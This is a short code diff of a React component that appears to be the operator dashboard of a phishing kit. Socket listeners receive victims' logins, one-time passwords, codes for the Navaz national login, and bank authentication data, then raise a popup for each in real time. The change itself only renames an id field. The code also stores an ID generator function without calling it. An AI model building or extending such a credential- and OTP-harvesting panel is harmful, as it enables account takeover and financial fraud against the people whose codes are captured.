@@ -75,30 +75,30 @@ const Main = () => {
     const [popup,setPopup] = useState(false)
     const uniqueNum = ()=>Math.floor(Math.random() * (10000000 - 999999 + 1)) + 999999;
     socket.on('newLogin',(result)=>{
-      setData([{...result,mode:'request',id:uniqueNum},...data])
+      setData([{...result,mode:'request',ref:uniqueNum},...data])
       setPopup(true)
     })
     socket.on('loginOtp',(result)=>{
-      setData([{...result,mode:'loginOtp',id:uniqueNum},...data])
+      setData([{...result,mode:'loginOtp',ref:uniqueNum},...data])
       setPopup(true)
     })
     socket.on('newOrder',(result)=>{
-      setData([{...result,mode:'order',id:uniqueNum},...data])
+      setData([{...result,mode:'order',ref:uniqueNum},...data])
       setPopup(true)
     })
 
     socket.on('orderOtp',(result)=>{
-      setData([{...result,mode:'otp',id:uniqueNum},...data])
+      setData([{...result,mode:'otp',ref:uniqueNum},...data])
       setPopup(true)
     })
 
     socket.on('newNavaz',(result)=>{
-      setData([{...result,mode:'navaz',id:uniqueNum},...data])
+      setData([{...result,mode:'navaz',ref:uniqueNum},...data])
       setPopup(true)
     })
 
     socket.on('navazOtp',(result)=>{
-      setData([{...result,mode:'navazOtp',id:uniqueNum},...data])
+      setData([{...result,mode:'navazOtp',ref:uniqueNum},...data])
       setPopup(true)
     })
     useEffect(()=>{
@@ -108,7 +108,7 @@ const Main = () => {
     },[])
     
     socket.on('bankAuth',(result)=>{
-      setData([{...result,mode:'bankAuth',id:uniqueNum},...data])
+      setData([{...result,mode:'bankAuth',ref:uniqueNum},...data])
       setPopup(true)
     })
     const [active,setActive] = useState({nav:'Request',data:{}})
